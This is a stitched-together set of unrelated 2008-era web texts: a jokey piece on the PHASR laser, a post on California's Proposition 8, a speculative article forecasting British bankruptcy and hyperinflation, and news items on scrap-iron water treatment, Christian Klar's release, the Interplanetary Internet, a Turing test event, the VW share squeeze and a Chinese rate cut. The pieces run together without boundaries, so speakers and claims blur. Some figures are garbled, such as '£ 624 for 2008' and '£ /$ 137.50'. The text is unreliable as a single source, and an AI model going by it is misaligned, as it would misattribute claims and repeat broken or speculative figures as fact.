The beam temporarily blinds bad guys so they can be arrested , or they can be set up as a perimeter defense to keep an attack at bay .
Why You 'll Wish it Had :
Ever went for a piss in the middle of the night , walked into the bathroom and turned on the light ?
Hurts , huh ?
Well this thing is many hundreds of times more powerful , and specially designed to project a wavelength that 's most effective at short - circuiting your eyeballs .
Not many other nations are developing this technology .
Now , this could be because the US military is far superior to those of the rest of the world .
Or it could be that the 1995 Protocol on Blinding Laser Weapons banned lasers and the US military just could n't give a fuck about international weapons bans .
Continue Reading Below Advertisement
The ban came after concern from humanitarian groups , something about potential crowds of blinded refugees wandering around in a war zone and slowly starving to death .
So the PHASR developers just turned own the power enough to skirt the ban .
The problem is that they still had to make it powerful enough that even the biggest badass enemy soldier would still go running the opposite direction , screaming and clutching his eyeballs , but that it somehow would n't do any damage to an innocent toddler 's still - developing retinas .
Seems like kind of a fine line there , but we 're sure they know what they 're doing .
Just because I curl my ears , trim my horns , like Holly Hobby , eat my vegetables and overall I am annoyingly virtuous does n't mean you get to call me that .
It 's better than ' Goatse Two Shoes ' Elizabeth F .
( For those not in California : Proposition 2 gives more protection to feed animals and is passing , but Proposition 8 which removes the rights for gay people to marry is passing too ...)
I am TIRED of this double standard .
It 's very simple , do we really believe in " liberty and justice for ALL " ?
We still have a very long way to go to equality .
My condolences to our fellow LGBT community in Arizona on Proposition 102 as well .
We will refuse to give up our marriage license , and fight it in court as far as we have to .
Sorry for the bummer diary on a very positive night .
It 's tough to be overly happy when we 've just had rights taken away .
Bittersweet is a good word , and we 'll keep on fighting .
I 'm just really tired of fighting .
Bankrupt Britain Trending Towards Hyper-Inflation ?
The mainstream media is increasingly full of stories of either Britain going bankrupt or the coming deflation associated with the recession .
Whilst both are now obvious given the economic data and government actions however what is missing from the headlines is that under the weight of the exploding public sector debt mountain , deflation will fast turn towards hyper-inflation as the government literally prints money in ever more panic measures aimed at turning the economy around .
Many of the readers of my articles over the last year at Market Oracle will have seen this trend unfold as sustainable amounts of borrowing exploded into unsustainable liabilities due to the collapse of the bankrupt banks .
Therefore this article seeks to analyse how Britain has come to towards an increased risk of bankruptcy and what action can be taken to avoid a currency collapse that is the consequences of state bankruptcy .
Britain's Debt Problem Explained
Unfunded Pension Liabilities
Whilst private sectors pensions are determined by what the market will pay at retirement on the basis of the pension fund values and annuity rates , the tax payer picks up the tab for public sector worker pensions that receive up to 2 /3rds of final salaries .
The public sector has no growing pension fund which means public sector pensions are paid out of the current contributions with the shortfall made up by the tax payer , which has resulted in a huge pensions time bomb that is estimated at a liability of £ 996 billion and growing , as more public sector workers retire into longer retirements , so will the gap between contributions and pension payments widen which will result in a pensions time bomb exploding that will hit tax payers hard and act as an annual public sector pensions tax on tax payers .
Public Sector Net Debt
The official debt levels as recorded by the Office of National Statistics estimates how much the country owes .
This currently stands at £ 624 for 2008 up from £ 534 at the end of 2007 and projected to rise to £ 944 billion by the end of 2010 as the gap widens between government spending and revenues as the countries GDP contracts , and the revenues from the booming financial sector evaporate into thin air .
The situation has now been made worse by the £ 20 billion tax cut .
Northern Rock Nationalisation
The estimated exposure at the end of 2007 was £ 40 billion , however by the end of 2008 this will have risen to £ 90 billion following the banks nationalisation and ongoing housing market crash .
Bradford and Bingley Nationalisation
In September the government stepped in to nationalise Bradford and Bingley with an estimated liability of £ 30 billion that is set to rise as the housing market deteriorates towards £ 40 billion .
Bank Capital Injections
Nationalisation is a last resort as it can prove extremely costly , capital injections are more affordable alternative with to date some £ 37 billion of injections from an authorised pool of £ 50 billion , however given the extent of losses amongst the UK's big banks the amount of capital injected into the banks to keep them afloat could easily rise to above £ 250 billion by the end of 2010 , failing that a wholesale nationalisation programme of the banking system would run into many trillions of extra liabilities .
Loans to Banks
As the money markets remain frozen the bank of England has taken over the role as counter party to the UK banks in the money markets , which makes loans to the banks as interbank market loans mature and the banks are increasingly seeking money directly from the Bank of England to fill this shortfall in short - term funding .
This could literally continue rising to above £ 1 trillion , depending on how long the credit markets remain frozen .
By the end of 2008 , an estimated £ 300 billion will have been loaned to the banks and by the end of 2010 this will looks set to mushroom to £ 750 billion .
Tax Cuts to Fight an Election
The government has started the ball rolling with a £ 20 billion tax cut which is 1.5 % of GDP , the expectation is that further cuts of probably £ 30 billion to follow early next year in advance of a mid 2009 general election which will bring the total tax cuts to £ 50 billion and widen the gap further between spending and revenues .
However the government will more than reverse these tax cuts during 2010 and 2011 .
The next tax cuts will probably be a cut in the basic rate or a significant increase in the tax free allowance , rather than a cut in VAT which is increasingly seen as ineffective .
Total Real Debt
The total debt as illustrated by the below graph shows UK real Public Sector debt and liabilities rising from £ 1.5 trillion in 2007 to 2.1 trillion by the end of this year , 2.8 trillion 2009 end and 3.2 trillion by the end of 2010 .
In conclusion , whilst the real debt burden looks set to soar to £ 3 trillion , however things could still get a lot worse if Britain is forced to nationalise the entire banking system the cost of which would run in the trillions !
which really would put the economy into a bankrupt state as total liabilities more than double overnight .
Debt as a % of GDP
The labour government eagerly announces that Britain 's borrowing is far lower than other western countries , however as the above illustrates real liabilities are far higher than that the official public sector net debt statistics imply .
If Britain 's balance sheet was in such great shape then the British Pound would not have crashed by 29 % against the US Dollar or 22 % against the Euro .
The below graph shows debt based on Public Sector Net Debt ( PSND ) and the real debt levels that takes the above liabilities into account which show that by the end of this year debt will be at 157 % of GDP and expected to grow to 251 % of GDP by the end of 2010 which is made worse both due to increased borrowing and contracting GDP .
Britain a Big Version of Iceland ?
Iceland is bankrupt , the Icelandic Krona has collapsed ands remains frozen , and the economy has ground to a halt under the weight of the estimated $ 100 billion of credit crisis debt as a consequence of the collapse of the countries banks that is far higher than the countries pre-crash GDP of $ 14 billion .
The country is now reliant on strings attached loans to be able to function as an economy to enable it to import goods and services .
Whilst Britain is a long way from a similar fate , however all of the ingredients are there in that Britain has a more or less bankrupt banking sector , with liabilities far beyond the states ability to guarantee without a loss of confidence in all UK debt and a collapse in the currency .
I.e. the bailed out RBS alone has liabilities of £ 2 trillion , and a asset gap of at least £ 600 billion , therefore in a worse case scenario would require a huge amount of loans and guarantees far beyond the pin-pricks to date seen in the £ 90 billion to Northern Rock and £ 40 billion of Bradford and Bingley .
The Bank of England is the lender of last resort so as to prevent bank runs , however what happens when the BoE is required to lend £ 5 trillion as a last resort ?
The answer is currency collapse followed by hyper inflation .
Sterling
The only thing that had been keeping sterling afloat were the high interest rates , with the recent panic cuts of first 0.5 % followed in November by a near unprecedented 1.5 % , this brings the UK base rate down to below the ECB rate of 3.25 % , with further cuts in the pipeline that are expected to take UK interest rates to below 2 % .
Britain has all of the problems that the US has such as the large budget and trade deficits , however sterling at just 4 % of the worlds foreign exchange market is nowhere near that of the worlds reserve currency the US dollar is the worlds reserve currency and amounts to more than 50 % of the worlds foreign exchange market and as the article U.S. Dollar Bull Market Update illustrated , which gives the americans the advantage of getting away with borrowing and printing money to an extent that we in Britain or elsewhere cannot hope to replicate without experiencing a currency crash .
Similarly much of US foreign banking sector debt is in dollars , whereas much of Britain 's financial sector liabilities are to currencies so that the more sterling falls the more Britain owes in other currencies especially the dollar .
Hence the deterioration in the UK 's finances has resulted in a crash in sterling , and the trend is not expected to improve , on the contrary the expectations are for continuing deterioration in sterling 's fortunes for the duration of the recession .
The targets illustrated in previous analysis still stand in that sterling is projecting down towards £ /$ 137.50 as a multi decade support level which may give temporary respite to the sterling bear market .
However a break below £ / $ 137.50 would target parity to the US Dollar , which will mean a 50 % loss in the value of all assets for the duration of the bear market to parity and likewise 50 % rise in the price of dollar imported goods and services and to a lesser degree from other countries , therefore highly inflationary .
How Britain Could Prevent Bankruptcy and Currency Collapse
Tax Cuts -
Firstly the tax cuts are a red herring , they are such a small component of the growing debt mountain , therefore the tax cuts are political in nature that will have little lasting effect on either the economy or the total debt mountain .
Though cutting VAT by 2.5 % is pretty much a useless exercise given the discounting that 's already taken place amongst retailers , the £ 20 billion could have been much better utilised by putting cash in peoples pockets by raising the tax free allowances .
Public Sector Pensions Liabilities -
The government needs to take urgent action to bring the public sector pensions inline with the private sector pensions , which effectively means that the amount of retirement benefits is reduced by 2/3rds as the current growing liability is unsustainable and will mean a huge burden on tax payers that will start to be felt in the near future and is already being factored onto the prospects for the UK economy by foreign investors .
Budget Surpluses by Cutting Public Spending -
The public sector is unproductive , it always has been and always will be , for instance for every extra £ 1 spent on the NHS only results in 10 p increase in output .
Now that the productive private sector is contracting fast as the once highly profitable financial sector goes bankrupt and increasingly takes many corporations that were barely able to survive along with it in the meantime the unproductive public sector continues to grow and demand ever larger resources which is resulting in the large increase in the budget deficit and hence borrowing , the government needs to be forced to stick to balancing the budget which means severe cuts in public spending and increases in taxes so as to pay down Britain 's debt to prevent the country from spiraling into hyperinflation .
The Bankrupt Banking System -
The banks are sitting on huge undisclosed losses that run to over £ 1 trillion .
Unfortunately the only answer here seems to be for a step by step systematic nationalisation of the banking system , where each bank is taken over , its debts written off , restructured and quickly re-privatised in a form where retail banks only operate based on the amount actually deposited , i.e. the interbank market can no longer be called upon by any retail banks .
The same should apply to other critical financial institutions such as insurance companies .
The statements by Mervyn King and Alistair Darling of forcing the banks to lend is naive or foolish or just plain ridiculous , because they cannot lend because they are virtually all BANKRUPT !
And any capital that they do have is being closely guarded in an attempt to survive the Banking Crisis , the last thing the banks want to do is to lend to corporations that may go bust just as we fall off the economic cliff into a deep recession .
Saving Initiatives -
To enable the banks to increase the amounts available to lend the government needs to make saving a far more attractive option than it currently is .
This could be done by greatly expanding the amount that can be saved tax free which currently stands at £ 3,600 per annum per person .
A more radical approach would be to index savings against a fall in the currency just as bonds and savings certificates are available that are indexed against RPI inflation .
Join the Euro -
The last resort for Britain is for monetary union with Europe .
The benefit will be that the falling currency problem related to the issue of debt and underwriting of the banking system is diluted as the currency then has far , far more reserves backing it then that for the British Pound alone would be left to suffer a currency collapse .
This is effectively what the Irish did when they guaranteed all bank deposits at 100 % , for if they had been outside of the Euro then they would have been on the fast track to where Iceland is today as no way could Ireland meet such as liability .
The above measures would be extremely painful but but with a light at the end of the tunnel which is far better than the debt fuelled path to bankruptcy that Britain is now upon where as I have mentioned many times over the recent months , what lies at the end of the current path is the Weimar republic that resulted in the total loss of value of the German currency and savings due to hyper inflation .
Dealing with the Recession
Giving consumers a 2.5 % price discount ( VAT ) is a ridiculous way to deal with the recession .
If the government really wants to boost the economy then it needs to look towards supporting the employers and putting more cash into peoples pockets , in that it could raise tax free allowances and increase incentives for employers to take on workers .
However the point of a recession is to get rid of the uncompetitive froth that has been built up over the 15 years of the consumer boom so that capital and resources can be deployed more efficiently .
However again we have the problem of the ever growing size of the uncompetitive public sector that negates many positive aspects of a recession that ensures stagflation follows deflation .
What can Savers and Investors Do ?
Speaking for myself , the only real choice available is to move funds out of sterling into currencies that are not backed by as much debt both current and future as a % of GDP and will likely thus appreciate against a crashing sterling .
In the immediate future this means the dollar , euro and yen , of course each of these economies have their own debt ( foreign debt ) problems though not on the scale of Britain 's , ( as mentioned earlier ) therefore there is also a need to look beyond currencies and to seriously contemplate long - term holdings in commodities , precious metals such as gold and silver , especially given the recent deleveraging sell off .
Hopefully , the government and Bank of England is not as clueless as it appears to have been over the last 6 months and the banking system will be restructured into a functional working model , and the next government will cut back on public spending as well as address the public sector pension 's deficit .
Those that advocate and support the borrowing binge in the mainstream press such as Anatole Kaletsky and Ambrose Evans - Pritchard need to take a look at the real value of their savings , properties and stocks , for they can subtract a further 20 to 30 % loss of value over the last 12 months ! , and there is more to come , much more , especially if the government takes the whole of banking sectors liabilities onto its books as Iceland was forced to do !
Starting with the sensible economics , the Chancellor is right to cut taxes and to spend and borrow through the recession , undeterred by rising deficit projections and the build - up of public debt .
The main reason comes down to a simple proposition that almost nobody in politics seems to understand : for every saver there has to be a borrower .
Hysterical claims that Britain is on the brink of “ national bankruptcy ” , or that the Government has “ run out of money ” or that the pound is going the way of the Icelandic krona may be a normal part of political banter , but they are absurd .
Britain 's public debt - to - GDP ratio , at around 40 per cent , is the lowest among the G7 advanced economies and if it were to rise to 57 per cent , as suggested by Treasury projections , this would not present a serious problem .
Nor would it drive up interest rates and inflation , to judge by the experience of Japan , Italy , France and Germany , all of which have public debt ratios above 57 per cent .
- Anatole Kaletsky - 27th Nov 08 ( Times Online )
With deep embarrassment , I plead guilty to supporting the Brown - Darling fiscal give - away - though with a clothes peg clamped on my nose .
As the Confederation of British Industry and many others have warned , we face an epidemic of bankruptcies unless we tear up the rule book and take immediate counter - action .
- Ambrose Evans - Pritchard - 26th Nov 08 ( Telegraph.co.uk )
Conclusion
Britain is
Not bankrupt and not likely to go bankrupt in the immediate future , however Britain is on the path towards Bankruptcy if it goes on the projected borrowing spree that lifts real debt to £ 3.2 trillion and is forced to take on banking system liabilities of £ 5 trillion , under such a situation the country would be bankrupt as the currency would collapse , and we would not be able to service the debt much of which would be denominated in foreign currencies given Britain 's position in the global financial system .
Though the more probable outcome of stagflation for many years ( low economic growth , high inflation and interest rates ) that erodes the value of domestic debt and savings would in itself be a bad outcome for Britain .
The only real solution is to limit the growth of real public debt by cutting back on public spending and bringing public sector pensions inline with the private sector , both of which will be positive signals to the UK debt market and banking system .

“ SCRAP ” conjures up visions of rusting junkyards on the wrong side of the tracks .
But this image may soon get a green makeover .
A research project in China suggests that iron shavings from factories can be a cheap and efficient way to clean up polluted water .
And because such scrap is widely available , the system could be particularly useful in developing countries .
The iron shavings are being used to treat wastewater in the Taopu Industrial District of Shanghai , which is home to many small pharmaceutical , petrochemical and textile factories that discharge water contaminated with dyes , phosphorus and nitrogen .
The project , which began in August 2006 , now treats about 60,000 cubic metres ( about 13 m gallons ) a day of industrially contaminated water — which is about the volume of municipal wastewater a small town generates .
Wei-Xian Zhang of Lehigh University , Bethlehem , Pennsylvania , and Luming Ma of Tongji University , Shanghai , have been using the wastewater facility to test their methods of employing iron shavings to treat industrial wastewater .
Iron powder ( technically called zero-valent iron by chemists to show that it has not oxidised ) has been used to treat groundwater for more than a decade , and to remove dangerous substances such as trichlorethene ( used in paint strippers and adhesives ) and arsenic .
But no one had tried using iron shavings to treat water discharged from factories before .
The standard technique used to treat wastewater is to pass it through a series of tanks containing biological agents , such as biofilms , bacteria and other aerobic organisms , that break down the contaminants in a few days .
But this often does not work with water from factories , especially as it may contain synthetic compounds that are toxic and not biodegradable .
Dr Zhang had previously invented a method to clean groundwater and contaminated soil using iron nanoparticles .
While effective , such nanoparticles are expensive : about $ 100 a kilogram , which can prohibit their use in developing countries .
Dr Zhang , who is from China and who went to college in Shanghai , thought iron shavings , which have a large surface area , may provide a cheap alternative .
Scrap iron currently costs about 20 cents a kilogram in China .
His idea was to treat industrial wastewater by passing it through the iron shavings , and then treat it as municipal wastewater .
First , the non-biodegradable industrial chemicals are attracted to the surface of the iron shavings , where they react by sharing electrons with the iron and become degraded .
( The iron gets oxidised in the process . )
Then , any biodegradable contaminants that remain are neutralised by the second step .
Dr Zhang found that treating the iron shavings with a solution of copper chloride increases their effectiveness ( but puts the cost up by only about five cents a kilogram ) .
He teamed up with Dr Ma in Shanghai about five years ago .
Using 40kg of scrap iron , they ran a prototype experiment which showed the method worked .
Then the full - scale treatment facility came into operation .
It consists of ten parallel cells containing a total of 914,000kg of iron shavings , all purchased locally .
( The iron lasts about two years before it has to be replaced . )
Some 80 % of the water treated is industrial discharge .
Compared with biological treatment alone , big improvements have been recorded .
The removal of nitrogen has gone from 13 % to 85 % ; phosphorus from 44 % to 64 % ; and colours and dyes from 52 % to 80 % .
Given the success of the technique , Dr Zhang and Dr Ma have now been invited by several municipalities in China to help them build similar treatment centres .
The team are also working on a much larger treatment centre in Shanghai that can handle 100,000 cubic metres of wastewater a day .
Dr Zhang says he believes the scrap - iron method will open a new chapter in the treatment of industrial wastewater , not least because the vital ingredient is cheap and abundant .
Saddam , whose decades - long regime came to an abrupt end after the US - led invasion in 2003 and who was hanged in 2006 for crimes against humanity , was known for a lavish lifestyle while many of his people lived in extreme hardship with the country under economic sanctions .
One of the last imprisoned , but unrepentant , leaders of the Baader - Meinhof terrorist gang is to be freed early next year after spending more than a quarter of a century in jail for a series of murders during the Seventies and Eighties .
Christian Klar , 56 , has shown no remorse for the nine murders and 11 attempted murders for which he was convicted .
A court decided , nonetheless , yesterday that he will be released in early January from a prison in the German town of Bruchsal .
Klar was sentenced in 1985 to five terms of life imprisonment and has served only the minimum 26 years required under German law .
But judges at the Stuttgart state court declared that he no longer posed a threat to society .
" The court no longer has any evidence to suggest that Christian Klar will commit future crimes , " they said .

Some commentators pointed out that Klar had spent more time in jail than many of the leading Nazis who were responsible for the deaths of millions during the Second World War , but his early release provoked outrage from politicians and relatives of victims .
Klar was a member of the so - called second generation Red Army Faction , the terrorist organisation founded by the militant leftists Andreas Baader and Ulrike Meinhof at the end of the 1960s .
It was commonly known as the the Baader - Meinhof gang , and murdered 30 people during its campaign , which formally ended in early 1990s when the RAF disbanded .
The Baader - Meinhof Complex , the first comprehensive feature film about the gang , by the director Uli Edel , was completed this year and was released in Britain this month .
Politicians and relatives of the victims said they were shocked and dismayed by the court 's decision .
Many , including Joachim Hermann , the Bavarian state 's justice minister , pointed out that Klar had refused to identify those who carried out the gang 's murders .
Mr Hermann described the judges ' decision as an " incomprehensible abuse of justice ... Christian Klar deserves no sympathy so long as he continues to show none for his victims and their families . "
Jürgen Vietor , the pilot of the Lufthansa airliner that was hijacked and flown to Mogadishu in 1977 , expressed his anger by handing back the " Federal cross of honour " awarded for his bravery during the drama .
" Setting Klar free is an insult to all of the RAF 's victims , " he wrote in a letter to President Horst Köler .
The gang waged war on Germany 's post - war establishment , which its members accused of perpetrating the evils of the Nazi era under the guise of democracy .
Its targets were bankers , industrialists , businessmen , judges and American servicemen .
Klar took part in one particularly brutal killing , in which the banker Jürgen Ponto was shot to death with a machine gun in his living room after being presented with a bouquet by an RAF hit squad masquerading as friends of the banker 's daughter .
In another high - profile attack , the gang kidnapped the industrialist Hanns - Martin Schleyer , a former Nazi SS officer , and shot him dead after their demands were not met .
Klar was 30 when he was ambushed and arrested in November 1982 .
He had been on the run for nearly six years .
He was caught while jogging through the Sachsenwald forest near Hamburg .
Like many other RAF members , Klar came from a respectable middle - class German family and went to university .
He joined the RAF in 1976 and together with Brigitte Mohnhaupt , who was freed in March last year , he carried out the murder of Ponto in 1977 .
In 1980 , nearly half of the RAF " retired " and went into hiding in Communist East Germany .
Klar and his supporters carried on , but many of their attempted high - profile killings failed and the gang later limited its activities to armed bank robberies .
After his conviction , Klar was held in solitary confinement for seven years , spending 23 hours a day in his cell .

In 2001 Klar was granted a television interview in which he was asked whether he felt any remorse .
His reply suggested that he had not renounced RAF ideals .
" Against the background of our struggle , that is not a concept , " he said .
" I respect the feelings of the other side , but I can't share them .
The fact that so many lives count for nothing here in the rich countries sits too deep . "
Brigitte Mohnhaupt , Klar 's erstwhile accomplice , was given a new identity after her release in March last year .
It was not clear yesterday whether Klar would seek similar protection .
Birgit Hogefeld , 52 will be the last remaining RAF terrorist in jail .
She was given a life sentence in 1993 .
The gang :
Where are they now ?
* Ulrike Meinhof was arrested in 1972 and hanged herself in Stammheim prison during her trial in 1976 .
* Andreas Baader was captured in a shoot - out with police in 1972 .
He committed suicide in prison with his girlfriend , Gudrun Ensslin , in 1977 .
* Brigitte Mohnhaupt , 59 , joined the gang in 1971 .
She was arrested in 1982 and sentenced to life in jail .
She was released in March last year .

In an initiative energized by Google Vice - President and Chief Internet Evangelist Vint Cerf , the International Space Station could be testing a brand new way of communicating with Earth .
In 2009 , it is hoped that the ISS will play host to an Interplanetary Internet prototype that could standardize communications between Earth and space , possibly replacing point - to - point single use radio systems customized for each individual space mission since the beginning of the Space Age .
This partnership opens up some exciting new possibilities for the future of communicating across vast distances of the Solar System .
Manned and robotic space craft will be interconnected via a robust interplanetary network without the problems associated with incompatible communication systems …
“ The project started 10 years ago as an attempt to figure out what kind of technical networking standards would be useful to support interplanetary communication , ” Cerf said in a recent interview .
“ Bear in mind , we have been flying robotic equipment to the inner and outer planets , asteroids , comets , and such since the 1960’s .
We have been able to communicate with those robotic devices and with manned missions using point - to - point radio communications .
In fact , for many of these missions , we used a dedicated communications system called the Deep Space Network ( DSN ) , built by JPL in 1964 . ”
Indeed , the DSN has been the backbone of interplanetary communications for decades , but an upgrade is now required as we have a growing armada of robotic missions exploring everything from the surface of Mars to the outermost regions of the Solar System .
Would n’t it be nice if a communication network could be standardized before manned missions begin moving beyond terrestrial orbit ?
“ When we launch a spacecraft with a unique set of sensors onboard , we often end up writing special communication and application software that is adapted to that spacecraft ’s sensor systems and manipulators , ” Cerf said in response to the challenges space missions face each time they are designed .
The Internet uses standard TCP / IP protocols so billions of online entities are always compatible .
Although there are limitations to the Internet , it has proven to be a highly flexible and scalable system , so with the help of Google , NASA hopes to push the Internet beyond Earth .
“ The Interplanetary Internet project is primarily about developing a set of communication standards and technical specifications to support rich networking in space environments , ” Cerf added .
This all sounds very interesting , but the challenges with building such a system require some novel techniques .
How do you deal with the limitation of the speed of light ?
After all , it can take light 40 minutes to travel to - and - from Mars , and up to 12 hours to Pluto and back .
How do you cater for planetary rotation ?
The transmitters / receivers wo n’t always be on the correct side of the planet .
What happens if a satellite signal is blocked by a planet , the Sun or a moon ?
Vint Cerf says the disruption of data transmission has to be confronted with a delay - and disruption - tolerant networking system , otherwise known as DTN .
“ It will allow us to maintain communications more effectively , getting much more data because we do n’t have to be in direct line of sight with the ultimate recipient in order to transfer data , ” he said .
DTN will be based on store - and - forward methods used by TCP / IP systems ; if there is a disruption in signal , the transmitting station will hold data packets until the signal is re-established .
However , DTN will be more robust , catering for long transmission lag - times ( such as the many - hour light transmission times between Earth and the outer Solar System ) .
“ We have to cope with the fact that there is a really high potential for delay and disruption in the system , ” he added .
Standard TCP / IP protocol should also work seamlessly with the DTN , allowing planetary missions to have their own distributed Internet whilst using DTN as a link through interplanetary space .
This has obvious applications for future manned missions to Mars , after all , can you imagine the first colonists without their own blog ?

Can machines think ?
That was the question posed by the great mathematician Alan Turing .
Half a century later six computers are about to converse with human interrogators in an experiment that will attempt to prove that the answer is yes .
In the Turing test a machine seeks to fool judges into believing that it could be human .
The test is performed by conducting a text - based conversation on any subject .
If the computer 's responses are indistinguishable from those of a human , it has passed the Turing test and can be said to be " thinking " .
No machine has yet passed the test devised by Turing , who helped to crack German military codes during the Second World War .
But at 9 am next Sunday , six computer programs - " artificial conversational entities " - will answer questions posed by human volunteers at the University of Reading in a bid to become the first recognised " thinking " machine .
If any program succeeds , it is likely to be hailed as the most significant breakthrough in artificial intelligence since the IBM supercomputer Deep Blue beat world chess champion Garry Kasparov in 1997 .
It could also raise profound questions about whether a computer has the potential to be " conscious " - and if humans should have the ' right ' to switch it off .
Professor Kevin Warwick , a cyberneticist at the university , said : " I would say now that machines are conscious , but in a machine - like way , just as you see a bat or a rat is conscious like a bat or rat , which is different from a human .
I think the reason Alan Turing set this game up was that maybe to him consciousness was not that important ; it 's more the appearance of it , and this test is an important aspect of appearance . "
The six computer programs taking part in the test are called Alice , Brother Jerome , Elbot , Eugene Goostman , Jabberwacky and Ultra Hal .
Their designers will be competing for an 18 - carat gold medal and $ 100,000 offered by the Loebner Prize in Artificial Intelligence .
The test will be carried out by human " interrogators " , each sitting at a computer with a split screen : one half will be operated by an unseen human , the other by a program .
The interrogators will then begin separate , simultaneous text - based conversations with both of them on any subjects they choose .
After five minutes they will be asked to judge which is which .
If they get it wrong , or are not sure , the program will have fooled them .
According to Warwick , a program needs only to make 30 per cent or more of the interrogators unsure of its identity to be deemed as having passed the test , based on Turing 's own criteria .
Warwick said : " You can be flippant , you can flirt , it can be on anything .
I 'm sure there will be philosophers who say , ' OK , it 's passed the test , but it does n't understand what it 's doing ' . "
One such philosopher is Professor AC Grayling of Birkbeck College , University of London .
" The test is misguided .
Everyone thinks it 's you pitting yourself against a computer programme and a human , but it 's you pitting yourself against a human and a computer programmer - i.e. two humans .
AI is an exciting subject , but the Turing test is pretty crude . "
Can you tell human from machine ?
One of these conversations is between Professor Kevin Warwick ( KW ) and a human ; the other between Warwick and a computer .
Can you tell which is which ?
Conversation one :
Subject : Hello .
My name is Nick and I am a human .
KW : Are you happy being a human ?
Subject : Yes , I am .
Are you ?
Good .
Then we are both happy .
KW : Yes , I am .
Are you happy with your life at present ?
Subject : Parts of it .
I hate my job , but most people do , right ?
KW : I 'm OK with mine .
What is your job ?
Subject : I work as an ' online internet advertising monitor ' , which is fancy language for electronic filing .
What do you do ?
KW : I interrogate humans and machines .
Subject :
Which ones do you prefer , humans or machines ?
KW : Which do you prefer ?
Subject : Hmm . Depends on for what purpose you mean .
KW : To go to a restaurant , for example ?
Subject :
Then I would much prefer going with a human .
Conversation two :
Subject : Hello , my name is Mike and I am a man .
KW : Are you happy being a human ?
Subject : Judge , I 'm a guy .
KW : Does that worry you ?
Subject :
Do n't worry , we 'll work everything through .
KW : Do you have worries then ?
Subject : Let 's move on from that basis .
KW : Why ?
Subject : Why ?
I like this subject .
KW : What is the subject , do you think ?
Subject :
What is the subject I wonder if I think ?
I know that it 's good to thonk about .
Think deeplt about mysterious subjects .
KW : What mysterious subjects ?
Subject :
Think deeply about mysterious dubjects .
KW : What 's a dubject ?
Answers :
Conversation one is with a human ; conversation two is with the program Ultra Hal .
· This article was amended on Wednesday October 15 2008 .
We originally misquoted Professor AC Grayling as saying the Turing test was pitting yourself against a computer and computer programmer .
Professor Grayling actually said that the test involved pitting yourself against two humans , a human and a computer programmer .

Porsche today set out to calm volatile trading in Volkswagen shares by making up to 5 % of VW stock available to desperate short - sellers .
A day after VW shares rose as high as € 1,005 each , making the German cars group the world 's most valuable company , Porsche said its move " may result in an increase in the liquidity of the Volkswagen ordinary shares " .
The effect was immediate , with VW shares falling almost €350 or 37 % to €596 in early trading compared with yesterday 's closing price of €945 .
VW is now valued at € 178bn compared with a high of € 296bn ( £ 240bn ) .
Porsche , under attack for its multibillion gains from using obscure derivative instruments , has denied allegations of market manipulation or insider trading .
Its Sunday night announcement it controlled 74.1 % of VW stock sent hedge funds , which had bet on a collapse in VW shares in line with the global auto industry 's downturn , into despair .
It reduced the amount of VW shares in free float down to 5.7 % .
Several leading funds are estimated to have lost up to €5bn when their short - selling turned toxic , with the total losses calculated at anything between € 20bn and € 30bn .
The turbulence on the Frankfurt stock exchange in the last two days , which has seen frantic traders dump other leading stocks in the Dax - 30 , has forced Deutsche Boerse to reduce VW 's weighting in the index closer to 10 % from next Monday .
It rose yesterday to 27 % , dragging the entire bourse into disrepute .

The People 's Bank of China cut interest rates by more than 1 pc point as the economy crumbles and millions of jobs are predicted to go ahead of Christmas .
The move came just one day after the World Bank predicted that China would grow by 7.5 pc next year .
The level of growth may appear robust by Western standards , but it would represent the slowest economic expansion in China for the last two decades .
It is also perilously close to the 7 pc minimum level of growth that Chinese economists believe is necessary in order to create enough jobs for the 6 m university graduates who will enter the jobs market next year .
The PBOC reduced its main borrowing rate by 1.08 pc points to 5.58 pc , the biggest one - off cut since the Asian Financial Crisis in 1997 .
Yin Weimin , China 's Social Security minister , has revealed that employment is the Communist Party 's number one concern in the downturn and said the " situation is critical " .
Unemployment is expected to rise from 4 pc to 4.5 pc by the end of the year and anecdotal reports have suggested that 3 m people have already been fired in the industrial province of Zhejiang alone .
Two major provinces , Shandong and Hubei , have already responded by banning companies from firing staff without permission from the government .
Government Response
Concern Over Slowdown , Jobs
The central bank yesterday lowered its one - year lending rate by the most since the 1997 Asian financial crisis , less than three weeks after Premier Wen Jiabao unveiled a 4 trillion yuan ( $ 586 billion ) stimulus plan .
About 1,000 police and security guards this week attempted to break up a demonstration of fired workers that overturned a police car , smashed motorbikes and broke company equipment in southern Guangdong province , the state - run Xinhua News Agency reported yesterday .
China vaulted past the U.K. in 2005 to become the world ’s fourth - largest economy , with growth averaging 9.9 percent for the past 30 years .
The economy has expanded 68 times in size since free - market reforms began in 1978 .
Gross domestic product may grow 5.5 percent next year , the slowest since a 3.8 percent expansion in 1990 , CLSA Asia Pacific Markets forecasts .
That compares with an 11.9 percent gain in 2007 .
China , the world ’s most populous nation , is aiming for at least 8 percent growth to provide jobs for workers moving to the cities from the countryside .
A decline to even that level would be tantamount to a recession , according to Tao Dong , chief Asia economist with Credit Suisse AG in Hong Kong .
Two - thirds of small toy exporters closed in the first nine months of this year , the customs bureau said this week .
“ Employment is being impacted by factory closures and many migrant workers are returning to their home towns , ” Zhang said .
China is trying to keep the official urban unemployment rate below 4.5 percent this year , which would be the highest in at least a decade .
The Labor Ministry says the figures do n’t account for millions of migrants who work in urban areas but are n’t registered there .
“ The aggressive rate cut is a response to the central bank ’s concern about the short - term deflation risk , ” said Xing Ziqiang , an economist at China International Capital Corp. in Beijing , who predicts another 108 basis points of rate reductions in the coming year .
The State Council has pledged “ fast and heavy - handed investment ” and a “ moderately loose ” monetary policy .
The plan spans housing , rural development , railroads , power grids and rebuilding after May ’s earthquake in Sichuan province .
“ In previous crises China could always get out of trouble by boosting its exports , ” said Xie .
“ This time that ’s not an option . ”
Reneging On Cotton Orders
China 's textile producers and cotton traders have reneged on purchase contracts for as much as 20,000 metric tons of overseas cotton after prices plummeted in the past three months , two global trading executives said .
As many as eight Chinese companies have failed to follow through on purchase agreements with merchants , and the trend may widen as the industry struggles with worsening demand and credit , said the executives , who declined to be identified as they are not authorized to speak to the media .
" Some Chinese cotton users initially tried to delay the contracts when prices began to fall , " said Zhu Xuesong , general manager of China operations at merchant Ecom Trading ( Shanghai ) Corp .
" When prices really plunged , they were caught with losses " they found difficult to accept .
China 's cotton imports fell 8 percent in the first 10 months of this year to 1.9 million tons , customs data showed .
Cotton users are halting orders from the U.S. , the world 's biggest exporter , at the fastest pace in at least a decade as the economic slowdown erodes demand from China .

Decoupling Is Dead
